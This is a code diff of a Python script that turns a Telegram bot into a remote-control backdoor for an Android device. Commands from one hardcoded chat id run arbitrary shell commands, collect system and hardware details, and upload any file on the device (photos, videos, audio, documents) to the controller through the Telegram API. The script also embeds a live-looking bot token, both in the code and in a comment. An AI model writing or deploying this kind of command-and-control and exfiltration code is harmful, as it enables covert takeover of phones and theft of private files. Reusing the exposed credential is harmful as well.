@@ -1,44 +1,64 @@
-import time,subprocess,requests
+import time,subprocess,requests,os,platform
 
-def send_message(message,chat_id):
+def send_message(message):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id':chat_id,'text':message,'parse_mode':'Markdown'})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id':root_id,'text':message,'parse_mode':'Markdown'})
         return {'ok':True,'result':result.status_code}
     except Exception as error:
         return {'ok':False,'result':error}
 
-def send_photo(path,caption,chat_id):
+def send_photo(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data={'chat_id':chat_id,'caption':caption},files={'photo':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data={'chat_id':root_id,'caption':caption},files={'photo':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error:
         return {'ok':False,'result':error}
 
-def send_video(path,caption,chat_id):
+def send_video(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVideo', data={'chat_id':chat_id,'caption':caption},files={'video':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVideo', data={'chat_id':root_id,'caption':caption},files={'video':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error:
         return {'ok':False,'result':error}
 
-def send_audio(path,caption,chat_id):
+def send_audio(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendAudio', data={'chat_id':chat_id,'caption':caption},files={'audio':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendAudio', data={'chat_id':root_id,'caption':caption},files={'audio':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error:
         return {'ok':False,'result':error}
 
-def send_document(path,caption,chat_id):
+def send_document(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id':chat_id,'caption':caption},files={'document':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id':root_id,'caption':caption},files={'document':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error:
         return {'ok':False,'result':error}
 
-def get_update():
+def get_update(offset):
     try:
-        result = requests.get(f'https://api.telegram.org/bot{bot_token}/getUpdates',timeout=5)
+        result = requests.get(f'https://api.telegram.org/bot{bot_token}/getUpdates',params={'offset':offset} if offset else {},timeout=5)
         return {'ok':True,'result':result.json()}
+    except Exception as error:
+        return {'ok':False,'result':error}
+
+def internet():
+    try:
+        result = requests.get('https://www.google.com',timeout=3)
+        return result.status_code == 200
+    except:
+        return False
+
+def notify_internet():
+    try:
+        print('waiting for connection...')
+        while True:
+            result = internet()
+            if result:
+                send_message(f'*info:* `{device}` back to connection')
+                print('connected\n')
+                return {'ok':True,'result':result}
+            time.sleep(0.5)
     except Exception as error:
         return {'ok':False,'result':error}
 
@@ -48,62 +68,119 @@ def gen_response(cmd):
         if not parts: return {'result':f'*status:* `command not given`','type':'message'}
         cmdlen = len(parts)
         main = parts[0]
-        if cmdlen == 1 and main.lower() == 'active': return {'result':f'*status:* `active`','type':'message'}
+        if cmdlen == 1 and main.lower() == 'active': return {'result':f'`{device}` is active','type':'message'}
+        elif cmdlen == 1 and main.lower() == 'sysinfo':
+            return {'result':f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nprocessor: `{platform.processor()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`','type':'message'}
+        elif cmdlen == 3 and main.lower() == 'send':
+            if not os.path.exists(parts[2]): return {'result':f'*status:* path not found `{parts[2]}`','type':'message'}
+            file_details = subprocess.getoutput(f'stat {parts[2]}')
+            if parts[1] == 'photo':
+                return {'result':{'file':parts[2],'caption':file_details},'type':'photo'}
+            elif parts[1] == 'video':
+                return {'result':{'file':parts[2],'caption':file_details},'type':'video'}
+            elif parts[1] == 'audio':
+                return {'result':{'file':parts[2],'caption':file_details},'type':'audio'}
+            elif parts[1] == 'document':
+                return {'result':{'file':parts[2],'caption':file_details},'type':'document'}
+            else:
+                return {'result':f'*status:* invalid option for `send`','type':'message'}
         elif cmdlen > 1 and main == ':':
             result = subprocess.run(parts[1:],capture_output=True,text=True,timeout=5)
             if result.stderr: return {'result':f'*error(out):* ```{result.stderr}```','type':'message'}
             if result.stdout: return {'result':f'*result(out):*\n```{result.stdout}```','type':'message'}
             return {'result':'*result(out):* `executed`','type':'message'}
-        else: return {'result':f'*status:* `invalid`','type':'message'}
+        else: return {'result':f'*status:* invalid `{cmd}`','type':'message'}
     except Exception as error:
         return {'result':f'*error:* `{error}`','type':'message'}
 
+count = 0
 seen_id = []
-admin_id = 7589082187
+offset = None
+root_id = 7589082187
 print('running....\n')
+device = subprocess.getoutput("getprop ro.product.brand")
 bot_token = '8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI'
+
+# https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/getUpdates
 
 while True:
     try:
-        update = get_update()
+        if not internet(): notify_internet()
+        update = get_update(offset)
         if not update['ok']:
             print('update error:',update['result'],'\n')
-            time.sleep(1)
+            time.sleep(0.5)
             continue
         update = update['result']
         if not update['ok']:
             print('api error:',update['result'],'\n')
-            time.sleep(1)
+            time.sleep(0.5)
             continue
         update = update['result']
         if not update:
-            print('message not found:',update,'\n')
-            time.sleep(1)
+            time.sleep(0.5)
             continue
         update = update[-1]
         update_id = update['update_id']
-        if update_id in seen_id:
-            time.sleep(1)
+        offset = update_id+1
+        if update_id in seen_id or count == 0:
+            if count == 0: seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
             continue
         chat_id = update['message']['chat']['id']
-        if chat_id != admin_id:
+        if chat_id != root_id:
             print('skipping unknown user:',chat_id,'\n')
-            time.sleep(1)
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
             continue
         try:
             message = update['message']['text']
         except KeyError:
-            print('send warning:',send_message('*error:* `invalid text format`',admin_id))
-            print('error: invalid text format','\n')
+            print('send warning:',send_message('*error:* `invalid text format`'))
             seen_id.append(update_id)
-            time.sleep(1)
+            time.sleep(0.5)
+            count += 1
             continue
         response = gen_response(message)
         if response['type'] == 'message':
-            print('message send:',send_message(response['result'],admin_id),'\n')
+            print('message send:',send_message(response['result']),'\n')
             seen_id.append(update_id)
-        time.sleep(1)
+            time.sleep(0.5)
+            count += 1
+            continue
+        elif response['type'] == 'photo':
+            print('send photo:',send_photo(response['result']['file'],response['result']['caption']),'\n')
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
+        elif response['type'] == 'video':
+            print('send video:',send_video(response['result']['file'],response['result']['caption']),'\n')
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
+        elif response['type'] == 'audio':
+            print('send audio:',send_audio(response['result']['file'],response['result']['caption']),'\n')
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
+        elif response['type'] == 'document':
+            print('send document:',send_document(response['result']['file'],response['result']['caption']),'\n')
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
+        else:
+            print('unknown send function called:',response['type'])
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
     except Exception as error:
         print('main eror:',error)
-        time.sleep(1)
+        time.sleep(0.5)
         continue
